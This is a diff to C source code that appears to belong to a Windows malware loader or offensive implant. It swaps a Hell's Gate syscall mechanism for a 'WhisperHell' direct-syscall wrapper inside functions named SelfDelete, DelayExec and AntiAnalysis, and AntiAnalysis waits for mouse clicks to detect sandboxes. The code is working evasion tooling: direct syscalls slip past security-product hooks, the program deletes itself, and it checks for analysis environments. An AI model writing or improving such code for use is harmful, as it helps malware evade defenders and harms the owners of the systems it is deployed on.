@@ -76,8 +76,8 @@ BOOL SelfDelete() {
 	}
 
 	// Closing the file handle
-	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
-	if ((status = HellDescent(hFile)) != 0x0) {
+	WhisperHell(g_SyscallsTable.NtClose.wSystemCall);
+	if ((status = NtClose(hFile)) != 0x0) {
 		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
@@ -119,8 +119,8 @@ BOOL SelfDelete() {
 	}
 
 	// Close the handle for deleting the file
-	HellsGate(g_SyscallsTable.NtClose.wSystemCall);
-	if ((status = HellDescent(hFile)) != 0x0) {
+	WhisperHell(g_SyscallsTable.NtClose.wSystemCall);
+	if ((status = NtClose(hFile)) != 0x0) {
 		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
@@ -174,8 +174,8 @@ BOOL DelayExec(DWORD dwMilliSeconds) {
 
 	DWORD T0 = g_Api.pGetTickCount64();
 
-	HellsGate(g_SyscallsTable.NtDelayExecution.wSystemCall);
-	status = HellDescent(
+	WhisperHell(g_SyscallsTable.NtDelayExecution.wSystemCall);
+	status = NtDelayExecution(
 		FALSE,
 		&delayInterval
 	);
@@ -213,8 +213,8 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds)
 		PRINTA("[#] Monitoring Mouse-Clicks For %d Seconds - Need %d Clicks To Pass\n", (dwMilliSeconds / 1000), REQUIRED_CLICKS);
 
 		// Creating a thread that runs 'InstallMouseHook' function
-		HellsGate(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
-		status = HellDescent(
+		WhisperHell(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
+		status = NtCreateThreadEx(
 			&hThread,
 			THREAD_ALL_ACCESS,
 			NULL,
@@ -229,10 +229,10 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds)
 		}
 
 		// Waiting for the thread for 'dwMilliSeconds'
-		HellsGate(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
+		WhisperHell(g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
 		delay = (LONGLONG)dwMilliSeconds * 10000;
 		delayInterval.QuadPart = -delay;
-		status = HellDescent(
+		status = NtWaitForSingleObject(
 			hThread,
 			FALSE,
 			&delayInterval
@@ -243,9 +243,8 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds)
 			return FALSE;
 		}
 
-		HellsGate(g_SyscallsTable.NtClose.wSystemCall);
-		status = HellDescent(hThread);
-
+		WhisperHell(g_SyscallsTable.NtClose.wSystemCall);
+		status = NtClose(hThread);
 		if (status) {
 			PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
 			return FALSE;
